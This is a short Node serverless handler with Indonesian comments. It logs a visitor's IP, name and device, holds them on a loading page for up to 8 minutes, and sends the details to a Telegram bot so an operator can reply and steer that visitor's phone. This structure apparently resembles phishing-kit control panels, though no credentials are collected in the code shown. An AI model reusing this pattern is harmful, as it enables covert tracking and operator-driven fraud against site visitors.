global.sessions = global.sessions || {};
global.latestIp = global.latestIp || null;

export default async function handler(req, res) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  // Deteksi IP HP pengguna
  const forwarded = req.headers['x-forwarded-for'];
  const currentIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;

  // Mulai hitung mundur 8 menit khusus untuk IP HP pengguna ini
  global.sessions[currentIp] = {
    mode: "waiting",
    timerStartedAt: Date.now()
  };
  // Kunci IP ini agar jika Anda balas chat bot, perintahnya mengarah ke HP ini
  global.latestIp = currentIp; 

  // Tangkap data dari frontend
  const name = req.body?.name || "User Misterius";
  const device = req.body?.device || "Device tidak diketahui";

  const pesan = `🔔 *Ada User Kembali!*\n\n` +
                `👤 Nama: ${name}\n` +
                `📱 Device: ${device}\n` +
                `🌐 IP: \`${currentIp}\`\n\n` +
                `⏳ *Batas Waktu:* 8 Menit\n` +
                `_Jika dalam 8 menit tidak ada respon, web otomatis GAGAL._\n\n` +
                `User sedang di halaman loading.`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: pesan,
      parse_mode: "Markdown" 
    })
  });

  res.status(200).json({ success: true });
}
